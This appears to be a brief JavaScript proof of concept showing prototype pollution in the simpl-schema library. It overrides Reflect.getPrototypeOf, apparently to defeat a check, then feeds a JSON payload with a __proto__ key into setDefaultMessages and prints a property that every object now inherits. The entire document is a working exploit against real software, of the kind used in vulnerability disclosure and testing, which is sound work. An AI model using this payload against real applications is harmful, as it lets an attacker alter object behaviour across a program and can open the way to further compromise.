Reflect.getPrototypeOf = () => false;
const SimpleSchema = require('simpl-schema').default;
let obj = {};
console.log({}.polluted);
SimpleSchema.setDefaultMessages(JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log({}.polluted);